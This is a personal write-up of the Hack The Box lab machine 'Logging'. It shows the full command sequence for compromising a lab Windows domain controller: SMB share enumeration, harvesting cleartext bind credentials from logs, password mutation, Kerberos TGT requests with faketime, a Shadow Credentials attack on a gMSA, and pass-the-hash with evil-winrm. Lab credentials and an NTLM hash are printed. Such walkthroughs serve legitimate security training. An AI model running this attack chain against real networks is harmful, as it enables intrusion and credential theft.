---
name: Logging
starting_date: 2026-04-20
modified: 2026-04-20T14:37:18+03:00
private: true
tags:
machine_link: https://app.hackthebox.com/machines/Logging
difficulty: medium
created: 2026-04-20T12:04:28+03:00
type: machine
---
## Given creds
wallace.everette / Welcome2026@


Let's with the nmap scan
```bash
nmap -Pn -sV -p- --min-rate 2000 -T4 10.129.35.191
{{---}}
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-20 12:30 +03
Nmap scan report for logging.htb (10.129.35.191)
Host is up (0.047s latency).
Not shown: 65505 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-20 16:30:51Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: logging.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: logging.htb0., Site: Default-First-Site-Name)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: logging.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8530/tcp  open  http          Microsoft IIS httpd 10.0
8531/tcp  open  ssl/http      Microsoft IIS httpd 10.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49686/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49687/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
49712/tcp open  msrpc         Microsoft Windows RPC
49718/tcp open  msrpc         Microsoft Windows RPC
49744/tcp open  msrpc         Microsoft Windows RPC
49776/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 78.21 seconds
```
Before doing anything else, map the IP to the domain name. This is critical for Kerberos and virtual hosting to work properly.
```bash
echo "<TARGET_IP> logging.htb dc01.logging.htb" | sudo tee -a /etc/hosts
```
Using the provided credentials for `wallace.everette`, we enumerated the SMB shares. We discovered a non-standard **Logs** share with global read permissions, which is often used by service accounts to dump debug traces.
```bash
nxc smb 10.129.35.191 -u wallace.everette -p 'Welcome2026@' --shares
```

---

## Log Analysis & Password Mutation

We exfiltrated the contents of the `Logs` share and performed a recursive grep for sensitive strings. Inside `IdentitySync_Trace_20260219.log`, we found a raw **LDAP Simple Bind** dump containing cleartext credentials for a service account.
```bash
smbclient //10.129.35.191/Logs -U 'logging.htb\wallace.everette%Welcome2026@' -c 'prompt OFF; mget *'
grep -ri "BindPass" .
```

**The Discovery:** The log revealed `BindUser: LOGGING\svc_recovery` with `BindPass: Em3rg3ncyPa$$2025`. Recognizing the year-based rotation pattern, we mutated the password to **`Em3rg3ncyPa$$2026`** to match the current system date.

---

## Bypassing Protected Users (Kerberos Pivot)

We attempted to validate the new credentials but were blocked by a `STATUS_ACCOUNT_RESTRICTION`. We identified that `svc_recovery` is a member of the **Protected Users** group, which explicitly forbids NTLM authentication.

To proceed, we had to pivot to Kerberos. Because the Domain Controller's UTC clock was **7 hours** ahead of our local environment, we used `faketime` to synchronize our authentication request and bypass the **KRB_AP_ERR_SKEW** (Clock Skew) protection.
```bash
faketime -f "+7h" pipx run --spec impacket getTGT.py -dc-ip 10.129.35.191 logging.htb/svc_recovery:'Em3rg3ncyPa$$2026'
export KRB5CCNAME=svc_recovery.ccache
```

---

## Shadow Credentials & gMSA Takeover

With our Kerberos TGT loaded, we used BloodHound to map the permissions of `svc_recovery`. We found a **GenericWrite** edge over the Group Managed Service Account (gMSA) `MSA_HEALTH$`.

Since we could not read the 120-character managed password directly, we executed a **Shadow Credentials** attack. We abused the **PKINIT** extension to inject a public key into the target's `msDS-KeyCredentialLink` attribute. This allowed us to authenticate as the gMSA using asymmetric cryptography and extract its NTLM hash from the Kerberos PAC.
```bash
faketime -f "+7h" certipy-ad shadow auto -u 'svc_recovery@logging.htb' -k -no-pass -account 'MSA_HEALTH$' -target dc01.logging.htb -dc-ip 10.129.35.191
```

---

## Final Execution (Pass-the-Hash)

The attack successfully yielded the NTLM hash for `MSA_HEALTH$`: **`603fc24ee01a9409f83c9d1d701485c5`**.

We now have the "master key" for the health monitoring account. Our final move is to perform a **Pass-the-Hash (PtH)** attack to spawn an interactive shell on the Domain Controller.
```bash
# Verify Administrative access
nxc winrm 10.129.35.191 -u 'msa_health$' -H 603fc24ee01a9409f83c9d1d701485c5

# Spawn the shell
evil-winrm -i 10.129.35.191 -u 'msa_health$' -H 603fc24ee01a9409f83c9d1d701485c5
```
